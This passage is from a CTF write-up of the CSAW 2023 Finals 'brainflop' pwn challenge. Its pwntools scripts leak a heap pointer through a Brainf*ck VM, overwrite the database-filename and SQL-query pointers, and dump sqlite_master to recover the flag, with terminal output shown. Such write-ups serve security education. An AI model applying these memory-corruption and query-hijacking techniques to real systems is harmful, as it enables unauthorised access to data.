r.sendlineafter(b' ? ', b'y')  # Enable backups so that database will be dumped
pl = b'<' * 0x650 + b',>' * 8 + b'todo_delete_this.db\0'
# Pad to fixed size so heap layout doesn't change
assert len(pl) <= 10000
pl = pl.ljust(10000, b'A')
r.sendlineafter(b'): ', pl)
# Send database file name address
for b in p64(leek + 0x1670):
   r.sendline(bytes([b]))

# Exit the program so that the backup will be performed
r.sendlineafter(b'>> ', b'3')

r.interactive()
```

When I ran this locally, the program created a `todo_delete_this.db` file, which confirms that I overwrote the database file name correctly.
However, when I ran it on the server, the output did not contain a flag:

<pre><code>[alex@ctf chal]$ ./solve.py REMOTE
[<font color="#A2734C"><b>!</b></font>] Could not populate PLT: module &apos;unicorn&apos; has no attribute &apos;UC_ARCH_RISCV&apos;
[<font color="#0071FF"><b>*</b></font>] &apos;/home/alex/brainflop/chal/challenge_patched&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A2734C">Partial RELRO</font>
    Stack:    <font color="#C01C28">No canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#26A269">PIE enabled</font>
    RUNPATH:  <font color="#C01C28">b&apos;.&apos;</font>
[<font color="#A2734C"><b>!</b></font>] Could not populate PLT: module &apos;unicorn&apos; has no attribute &apos;UC_ARCH_RISCV&apos;
[<font color="#0071FF"><b>*</b></font>] &apos;/home/alex/brainflop/chal/libc.so.6&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A2734C">Partial RELRO</font>
    Stack:    <font color="#26A269">Canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#26A269">PIE enabled</font>
[<font color="#0071FF"><b>*</b></font>] &apos;/home/alex/brainflop/chal/ld-2.38.so&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A2734C">Partial RELRO</font>
    Stack:    <font color="#C01C28">No canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#26A269">PIE enabled</font>
[<font color="#26A269"><b>+</b></font>] Opening connection to pwn.csaw.io on port 9999: Done
[<font color="#0071FF"><b>*</b></font>] hex(leek)=&apos;0x555e886ee330&apos;
[<font color="#0071FF"><b>*</b></font>] Switching to interactive mode
Goodbye!
Performing backup for task 2
TIMESTAMP = timestamp
TAPESTATE = |

TIMESTAMP = Sun Dec 31 00:46:27 2023

TAPESTATE = |0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|

[<font color="#0071FF"><b>*</b></font>] Got EOF while reading in interactive
<font color="#C01C28"><b>$</b></font> <span style="background-color:#FFFFFF"><font color="#1E1E1E"> </font></span>
</code></pre>

### Finding the flag

This was pretty disappointing and I got stuck here for a while.
Later, I figured that surely the `todo_delete_this.db` comment isn't just a red herring and the flag might be in a different table.
I noticed that each `BFTask` instance has its own copy of the SQL query command stored inside an `std::string`, so we can overwrite the pointer in a similar way to make it point to our own SQL command.
I modified the Brainf\*ck program to also overwrite the pointer to the SQL command, and [Aplet123](https://aplet.me/) gave me a query that lists the tables.
The SQL command had to not contain any spaces, since the Brainf\*ck program was read from `std::cin` using the `>>` operator, which doesn't read whitespace.
The script now looks like this:

```python
# Overwrite database file name and SQL query
r.sendlineafter(b'>> ', b'1')  # Create new VM
r.sendlineafter(b' ? ', b'y')  # Enable backups so that database will be dumped
pl = b'<' * 0x650 + b',>' * 8 + b'<' * 0x30 + b',>' * 8 + b'SELECT*FROM`sqlite_master`;--todo_delete_this.db\0'
# Pad to fixed size so heap layout doesn't change
assert len(pl) <= 10000
pl = pl.ljust(10000, b'A')
r.sendlineafter(b'): ', pl)
# Send database file name address
for b in p64(leek + 0x16cd):
   r.sendline(bytes([b]))
# Send SQL query address
for b in p64(leek + 0x25c0):
   r.sendline(bytes([b]))

# Exit the program so that the backup will be performed
r.sendlineafter(b'>> ', b'3')

r.interactive()
```

When I ran it on remote, I got a bunch of output with the flag near the end:

<pre><code>[alex@ctf chal]$ ./solve.py REMOTE
[<font color="#A2734C"><b>!</b></font>] Could not populate PLT: module &apos;unicorn&apos; has no attribute &apos;UC_ARCH_RISCV&apos;
[<font color="#005DD0"><b>*</b></font>] &apos;/home/alex/brainflop/chal/challenge_patched&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A2734C">Partial RELRO</font>
    Stack:    <font color="#C01C28">No canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#26A269">PIE enabled</font>
    RUNPATH:  <font color="#C01C28">b&apos;.&apos;</font>
[<font color="#A2734C"><b>!</b></font>] Could not populate PLT: module &apos;unicorn&apos; has no attribute &apos;UC_ARCH_RISCV&apos;
[<font color="#005DD0"><b>*</b></font>] &apos;/home/alex/brainflop/chal/libc.so.6&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A2734C">Partial RELRO</font>
    Stack:    <font color="#26A269">Canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#26A269">PIE enabled</font>
[<font color="#005DD0"><b>*</b></font>] &apos;/home/alex/brainflop/chal/ld-2.38.so&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A2734C">Partial RELRO</font>
    Stack:    <font color="#C01C28">No canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#26A269">PIE enabled</font>
[<font color="#26A269"><b>+</b></font>] Opening connection to pwn.csaw.io on port 9999: Done
[<font color="#005DD0"><b>*</b></font>] hex(leek)=&apos;0x5557cfd4f330&apos;
[<font color="#005DD0"><b>*</b></font>] Switching to interactive mode
Goodbye!
Performing backup for task 2
type = table
name = brainflop
tbl_name = brainflop
rootpage = 2
sql = CREATE TABLE brainflop(
            ID                  INT PRIMARY KEY,
            TASKID              INT NOT NULL,
            TIMESTAMP           TEXT NOT NULL,
            TAPESTATE           TEXT NOT NULL
        )

type = index
name = sqlite_autoindex_brainflop_1
tbl_name = brainflop
rootpage = 3
sql = NULL

type = table
name = pastablorf
tbl_name = pastablorf
rootpage = 4
sql = CREATE TABLE pastablorf(DATA TEXT)

type = table
name = blamfogg
tbl_name = blamfogg
rootpage = 5
sql = CREATE TABLE blamfogg(DATA TEXT)

type = table
name = qubblezop
tbl_name = qubblezop
rootpage = 6
sql = CREATE TABLE qubblezop(DATA TEXT)

type = table
name = quasarquirk
tbl_name = quasarquirk
rootpage = 7
sql = CREATE TABLE quasarquirk(DATA TEXT)

type = table
name = heartworp
tbl_name = heartworp
rootpage = 8
sql = CREATE TABLE heartworp(DATA TEXT)

type = table
name = cuzarblonk
tbl_name = cuzarblonk
rootpage = 9
sql = CREATE TABLE cuzarblonk(DATA TEXT)

type = table
name = flutterquap
tbl_name = flutterquap
rootpage = 10
sql = CREATE TABLE flutterquap(DATA TEXT)

type = table
name = glrixatorb
tbl_name = glrixatorb
rootpage = 11
sql = CREATE TABLE glrixatorb(DATA TEXT)

type = table
name = queezlepoff
tbl_name = queezlepoff
rootpage = 12
sql = CREATE TABLE queezlepoff(DATA TEXT)

type = table
name = gazorpazorp
tbl_name = gazorpazorp
rootpage = 13
sql = CREATE TABLE gazorpazorp(DATA TEXT)

type = table
name = nogglyblomp
tbl_name = nogglyblomp
rootpage = 14
sql = CREATE TABLE nogglyblomp(DATA TEXT)

type = trigger
name = hide_corp_secrets
tbl_name = brainflop
rootpage = 0
sql = CREATE TRIGGER hide_corp_secrets
        AFTER INSERT ON brainflop
        BEGIN 
            UPDATE heartworp SET DATA = replace(DATA, &quot;csawctf{ur_sup3r_d4ta_B4S3D!!}&quot;, &quot;wowzers you&apos;re too late!&quot;);
        END

[<font color="#005DD0"><b>*</b></font>] Got EOF while reading in interactive
<font color="#C01C28"><b>$</b></font> <span style="background-color:#FFFFFF"><font color="#1E1E1E"> </font></span>
</code></pre>

Full solve script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.38.so")

context.binary = exe

if args.REMOTE:
    r = remote("pwn.csaw.io", 9999)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

# Cause some heap allocations for leaking heap address
r.sendlineafter(b'>> ', b'1')  # Create new VM
r.sendlineafter(b' ? ', b'n')  # Disable backups
r.sendlineafter(b'): ', b'A' * 200)  # Long BF program to cause allocations

# Leak heap address
r.sendlineafter(b'>> ', b'2')  # Reuse existing VM
r.sendlineafter(b'>> ', b'1')  # VM index
r.sendlineafter(b' ? ', b'y')  # Enable backups (I don't remember why)
r.sendlineafter(b'): ', b'>' * 0x48 + b'.>' * 8)  # BF program to print pointer
leek = u64(r.recv(8))
log.info(f'{hex(leek)=}')

# Overwrite database file name and SQL query
r.sendlineafter(b'>> ', b'1')  # Create new VM
r.sendlineafter(b' ? ', b'y')  # Enable backups so that database will be dumped
pl = b'<' * 0x650 + b',>' * 8 + b'<' * 0x30 + b',>' * 8 + b'SELECT*FROM`sqlite_master`;--todo_delete_this.db\0'
# Pad to fixed size so heap layout doesn't change
assert len(pl) <= 10000
pl = pl.ljust(10000, b'A')
r.sendlineafter(b'): ', pl)
# Send database file name address
for b in p64(leek + 0x16cd):
   r.sendline(bytes([b]))
# Send SQL query address
for b in p64(leek + 0x25c0):
   r.sendline(bytes([b]))

# Exit the program so that the backup will be performed
r.sendlineafter(b'>> ', b'3')

r.interactive()
```

# Conclusion

When I read the [challenge author's solution](https://github.com/osirislab/CSAW-CTF-2023-Finals/tree/main/pwn/brainflop#solution), I realized that we had solved this challenge in a way that was easier than intended.
The author did some heap feng shui to make overwriting the file name pointer possible, but I didn't need any of that.
Padding the program to a fixed size probably helped.
Also, it looks like we were supposed to do a bit of detective work to find the flag in the database after overwriting the SQL query.
The flag was in one of several tables with random names and it had been overwritten using an SQL trigger, but we just dumped the whole `sqlite_master` table which had the flag inside.
It looks like this challenge was intended to be as hard as it initially seemed, but we got a bit lucky.
